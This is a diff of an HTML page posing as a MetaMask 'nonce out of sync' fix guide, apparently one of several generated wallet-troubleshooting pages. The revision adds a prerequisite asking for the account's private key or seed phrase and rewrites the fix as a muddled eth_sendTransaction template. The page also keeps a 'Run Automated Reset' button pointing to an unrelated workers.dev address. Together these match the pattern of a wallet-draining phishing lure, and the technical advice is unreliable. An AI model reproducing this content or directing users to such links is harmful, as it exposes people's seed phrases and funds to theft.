@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync</title>
+<head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #0f111a;
+        font-family: system-ui;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #00adb5; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -39,35 +39,41 @@
 </head>
 <body>
 <div class="content">
+<h1>Metamask Nonce Out Of Sync</h1>
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "Nonce out of sync" error when attempting to send a transaction using Metamask on the Ethereum (ETH) network, indicating a discrepancy between the expected and actual transaction count.</li>
+<li>Users experience transaction failure with an error message indicating that the MetaMask nonce is out of sync, preventing them from successfully sending transactions on the Ethereum network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a mismatch between the nonce value stored in Metamask and the actual nonce value on the Ethereum blockchain, often resulting from cancelled or pending transactions that have not been properly cleared.</li>
+<li>The error occurs due to a mismatch between the expected transaction nonce stored in MetaMask and the actual nonce on the Ethereum blockchain, often resulting from cancelled or pending transactions that have not been properly cleared.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the account in Metamask to resynchronize the nonce.</li>
-<li>Manually adjust the nonce value in the transaction settings to match the current blockchain state.</li>
-<li>Utilize the Ethereum JSON-RPC API to fetch the correct nonce value and update Metamask accordingly, as shown in the following code block:</li>
+<li>Reset the account in MetaMask to resync the nonce with the blockchain state.</li>
+<li>Use the <code>eth.getTransactionCount</code> method to retrieve the current transaction count for the affected account.</li>
+<li>Update the nonce manually using the following JSON-RPC command:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_getTransactionCount&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;latest&quot;</span><span class="p">],</span>
-<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_sendTransaction&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...your_account_address...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;nonce&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...correct_nonce...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">]</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external console for more advanced troubleshooting and direct access to Ethereum network data.</p>
-<h2>Prerequisites</h2>
-<ul>
-<li>Metamask extension installed and configured.</li>
-<li>Basic understanding of Ethereum transaction mechanics.</li>
-<li>Access to the Ethereum JSON-RPC API or a compatible wallet interface.</li>
-</ul>
+<p>Prerequisites:
+* A basic understanding of Ethereum transactions and nonces
+* Access to the Ethereum JSON-RPC API
+* The affected account's private key or seed phrase
+After executing these commands, consider utilizing an external Ethereum console for further debugging and transaction management.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reco</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
